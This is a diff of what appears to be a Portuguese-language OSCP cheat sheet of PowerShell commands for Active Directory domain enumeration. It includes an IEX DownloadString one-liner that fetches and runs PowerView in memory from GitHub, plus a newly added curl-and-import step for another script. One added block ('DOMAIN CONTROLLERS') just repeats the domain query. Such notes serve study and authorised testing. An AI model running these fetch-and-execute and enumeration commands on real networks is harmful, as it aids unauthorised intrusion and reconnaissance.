@@ -91,7 +91,7 @@ Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessI
 Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}}, @{name='User';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Username}}  | ?{$_.LocalPort -eq 30900} | Format-Table
 ```
 
-## ACTIVE DIRECTORY ENUMERATION
+## ACTIVE DIRECTORY - DOMAIN ENUMERATION
 
 ##### POWERVIEW INSTALLATION
 ```
@@ -105,7 +105,12 @@ import-module .\PowerView.ps1
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
 ```
-
+CARREGAR A DLL COMO TXT
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Import-ActiveDirectory.ps1  -Outfile Import-ActiveDirectory.ps1
+Import-module .\Import-ActiveDirectory.ps1
+Import-ActiveDirectory
+```
 ##### LIST - FOREST
 ```
 $MyForest = [System.DirectoryServices.ActiveDirectory.Forest]
@@ -119,7 +124,16 @@ Write-Host -ForegroundColor Green "Forest Name: $($MyForestInfo.Name)"
 Write-Host -ForegroundColor Green "Forest Mode: $($MyForestInfo.ForestMode)"
 Write-Host -ForegroundColor Green "Forest Functional Level: $($MyForestInfo.ForestMode)"
 ```
-
+##### LIST - DOMAIN
+```
+$MyDomain = [System.DirectoryServices.ActiveDirectory.Domain]
+$MyDomain::GetCurrentDomain()
+```
+##### LIST - DOMAIN CONTROLLERS
+```
+$MyDomain = [System.DirectoryServices.ActiveDirectory.Domain]
+$MyDomain::GetCurrentDomain()
+```
 ##### POWERVIEW - IMPORT
 ```
 Import-module .\Microsoft.ActiveDirectory.Management.dll
